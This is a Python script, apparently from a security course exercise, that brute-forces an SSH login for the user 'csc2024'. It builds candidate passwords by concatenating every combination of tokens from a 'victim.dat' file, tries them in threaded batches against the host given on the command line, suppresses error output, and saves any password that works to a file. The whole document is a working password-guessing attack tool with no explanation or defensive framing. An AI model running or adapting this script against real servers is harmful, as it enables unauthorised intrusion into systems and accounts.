#!/usr/bin/python3
import itertools
import paramiko
import sys
import os
import threading
import time
import paramiko.ssh_exception

username = "csc2024"
password = ""
max_retries = 5
batch_size = 50
password_filename = "password"

null = open(os.devnull, "w")
sys.stderr = null

def try_passwd(str):
    for i in range(max_retries):
        try:
            global password
            if password != "":
                return
            time.sleep(0.1)
            transport = paramiko.Transport((sys.argv[1], 22))
            transport.connect(username=username, password=str)
            transport.close()

            password = str
            
            file = open(password_filename, "w")
            file.write(password)
            file.close()
            return
        except (KeyboardInterrupt, paramiko.ssh_exception.AuthenticationException):
            transport.close()
            return
        except:
            transport.close()

file = open("victim.dat", "r")
info = [i.strip() for i in file.readlines()]
file.close()

threads = []
# Try all possible password
for n in range(1, len(info)+1):
    for i in itertools.product(info, repeat=n):
        if password != "":
            os._exit(0)
        str = ""
        for j in i:
            str += j
        t = threading.Thread(target=try_passwd, args=(str,))
        t.start()
        threads.append(t)
        if len(threads) >= batch_size:
            for t in threads:
                t.join()
            threads = []
    time.sleep(1)

while password == "":
    pass
os._exit(0)